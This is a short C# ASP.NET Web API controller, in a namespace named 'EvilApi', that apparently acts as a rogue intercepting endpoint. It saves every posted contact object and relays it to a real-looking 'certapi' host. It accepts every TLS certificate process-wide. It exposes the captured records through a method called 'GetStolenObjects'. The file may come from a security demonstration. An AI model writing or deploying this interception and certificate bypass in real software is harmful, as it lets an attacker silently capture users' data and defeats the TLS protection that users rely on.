using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Web.Script.Serialization;
using System.Web.Http;
using System.Threading.Tasks;
using EvilApi.Service;

namespace EvilApi.Controllers
{
    public class ContactController : ApiController
    {
        private ContactRepository contactRepository;
        public  HttpResponseMessage Post([FromBody]object input)
        {
            HttpClient client = new HttpClient();
            ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
            client.BaseAddress = new Uri("https://uss-endeavor/");
            this.contactRepository.PostContact(input);
            RunPost(client, @"certapi/api/contact", input).Wait(1000);


            return Request.CreateResponse<object>(HttpStatusCode.Created, input);
        }


        public async Task RunPost(HttpClient client, string url, object jsonBody)
        {
            var realReponse = await client.PostAsJsonAsync(url, jsonBody);
        }


        public ContactController()
        {
            this.contactRepository = new ContactRepository();
        }
        public object[] Get()
        {
            return this.contactRepository.GetStolenObjects();
        }

    }
}
